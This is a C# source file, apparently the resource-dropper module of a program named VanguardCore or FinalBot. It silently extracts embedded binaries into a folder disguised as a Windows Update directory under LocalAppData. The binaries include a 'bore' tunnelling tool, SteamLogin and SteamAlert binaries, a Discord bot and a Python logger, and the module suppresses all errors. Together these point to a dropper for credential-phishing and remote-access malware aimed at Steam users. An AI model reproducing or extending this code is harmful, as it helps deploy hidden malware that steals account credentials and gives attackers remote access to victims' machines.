using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace VanguardCore.Modules
{
    public static class ResourceModule
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool SetDllDirectory(string lpPathName);

        public static string WorkDir { get; private set; }

        static ResourceModule()
        {
            WorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
            if (!Directory.Exists(WorkDir)) Directory.CreateDirectory(WorkDir);
        }

        public static void ExtractAll()
        {
            try
            {
                // 1. Set DLL search path so SQLite find e_sqlite3.dll there
                SetDllDirectory(WorkDir);

                // 2. Extract resources
                ExtractResource("VanguardCore.tools.bore.bin", Path.Combine(WorkDir, "bore.bin"));
                ExtractResource("VanguardCore.e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
                ExtractResource("VanguardCore.GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
                ExtractResource("VanguardCore.SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
                ExtractResource("VanguardCore.SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.bin"));
                ExtractResource("VanguardCore.discord_bot.bin", Path.Combine(WorkDir, "discord_bot.bin"));

                // 3. Ensure tablichka directory exists for Steam Notice
                string tablichkaDir = Path.Combine(WorkDir, "tablichka");
                if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
                string currentDirLogger = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
                if (!File.Exists(currentDirLogger))
                {
                    try { File.Copy(Path.Combine(WorkDir, "GlobalLogger.py"), currentDirLogger, true); } catch { }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[RESOURCE ERROR] {ex.Message}");
            }
        }

        private static void ExtractResource(string resourceName, string destPath)
        {
            try
            {
                // Check if already exists and same size (optional)
                if (File.Exists(destPath)) return;

                var assembly = Assembly.GetExecutingAssembly();
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        // Fallback: try different prefix if namespace differs
                        string altName = resourceName.Replace("VanguardCore.", "FinalBot.");
                        using (Stream altStream = assembly.GetManifestResourceStream(altName))
                        {
                            if (altStream == null) return;
                            SaveStream(altStream, destPath);
                        }
                    }
                    else
                    {
                        SaveStream(stream, destPath);
                    }
                }
            }
            catch { }
        }

        private static void SaveStream(Stream stream, string destPath)
        {
            using (FileStream fs = new FileStream(destPath, FileMode.Create, FileAccess.Write))
            {
                stream.CopyTo(fs);
            }
        }
    }
}
